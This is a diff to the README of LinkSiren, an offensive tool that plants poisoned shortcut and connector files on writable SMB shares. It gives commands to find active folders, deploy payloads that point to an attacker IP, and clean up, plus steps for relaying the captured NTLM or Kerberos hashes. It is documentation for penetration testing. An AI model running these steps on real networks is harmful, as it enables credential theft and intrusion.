@@ -35,9 +35,6 @@ python -m pip install -r requirements.txt
 
 # How do I use this NOW?
 ```bash
-# Install using pipx
-pipx install linksiren
-
 # Identify optimal locations for poisoned file deployment
 linksiren identify --targets <shares file> [domain]/username[:password]
 
@@ -51,36 +48,37 @@ linksiren cleanup --targets payloads_written.txt [domain]/username[:password]
 ```
 
 # How do I use this the \~right\~ way?
+1. Create a targets file for crawling containing accessible hosts, shares, or folders on each line in the following format. If a host is specified, shares will be identified on the host and treated as the next level of depth for crawling:
+`\\server1.domain.tld\`
+`\\server2.domain.tld\share1`
+`\\server3.domain.tld\share2\folder1\subfolder1`
+
+2. Use LinkSiren to crawl the provided paths to the specified depth, searching for the ideal location to place a file that will coerce authentication. Resulting UNC paths are saved in `folder_targets.txt` in the current directory.
 ```bash
-# Install using pipx
-pipx install linksiren
-
-# 1. Create a targets file containing accessible shares, one per line, in the following format: \\server.domain.tld\share
-#    I recommend crackmapexec or shareenum, make sure you can delete files you deploy
-
-# 2. Use LinkSiren to identify the most active folders on them
-#    Note: You may fine tune the --max-depth, --active-threshold, --fast, and --max-folders-per-share params as necessary
-#    Note: Specify '.' as the domain to log in using a local user account
+# Note: You may fine tune the --max-depth, --active-threshold, --fast, and --max-folders-per-share params as necessary
+# Note: Specify '.' as the domain to log in using a local user account
 linksiren identify --targets <shares file> [domain]/username[:password]
+```
 
-# 3. Use LinkSiren to deploy payloads to all of the active folders
-#    --identify saves UNC paths to active folders in folder_targets.txt
+3. Use LinkSiren to deploy payloads to the locations identified in step 2. Optionally, specify a payload name and extension. The payload type (.searchConnector-ms, .library-ms, .lnk, or .url) will be selected automatically from the extension. Folders where payloads were successfully written are saved to `payloads_written.txt`. Use the hostname or DNS name of the attacker host and perform poisoning as necessary to get intranet zoned, as described in my [blog post](https://alittleinsecure.com/dns-hijacking-say-my-name/) and [theHackerRecipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#abuse), to coerce HTTP authentication.
+```bash
 linksiren deploy --targets folder_targets.txt --attacker <attacker IP> [domain]/username[:password]
+```
 
-# 4. Let the hashes come to you and relay them as you see fit :)
-#    Use CrackMapExec and LdapRelayScan for relay target identification
-#    Use LdapRelayScan to determine if you can relay HTTP auth to LDAP
-#    Use Impacket's ntlmrelayx for relay with pcredz for hash capture on the attacker machine
-#    You could also use KrbJack to relay kerberos auth to a machine whose DNS record you've hijacked
+4. Let the hashes come to you and relay them as you see fit :)
+    - Use [LdapRelayScan]() to identify LDAP services vulnerable to relay.
+    - Use [mssqlrelay](https://github.com/CompassSecurity/mssqlrelay) to identify MSSQL services that do not enforce encryption and are therefore vulnerable to relay. Also, consider combining this with information about Microsoft Configuration Manager to perform [TAKEOVER-1](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md).
+    - Use [NetExec's SMB functionaltiy](https://www.netexec.wiki/smb-protocol/enumeration/smb-signing-not-required) to identify SMB services vulnerable to relay.
+    - Use Impacket's ntlmrelayx for relay with pcredz for hash capture on the attacker machine
+    - [Krbjack](https://github.com/almandin/krbjack) or [Krbrelayx](https://github.com/dirkjanm/krbrelayx) could also be used to relay Kerberos authentication to a machine whose DNS record is controlled if the target service maps to the same service class and the service does not implement signing, channel binding, or extended protection for authentication.
 
-# 5. Cleanup the payload files when you're finished gathering.
-#    Set targets to a file containing UNC paths of all folders where payloads were written
-#    --deploy saves UNC paths to deployed payloads in payload_folders.txt
-#    Note: If you set a custom payload name (--payload) when deploying, you must set the same name here
+5. Cleanup the payload files when the attack is finished. LinkSiren will output messages about any previously written payloads that it isn't able to successfully delete.
+    - Note: If you set a custom payload name (--payload) when deploying, you must set the same name here
+```bash
 linksiren cleanup --targets payloads_written.txt [domain]/username[:password]
 ```
 
-# What is the Attack Path?
+# What is the Attack Path Associated With This Tool?
 1. (Optional) Get Intranet-Zoned if you want to coerce HTTP authentication. See the note in [theHackerRecipes WebClient Abuse](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient#abuse).
 2. Create a list of UNC paths to writeable SMB shares.
     - Note: Make sure you can delete files in them for cleanup.
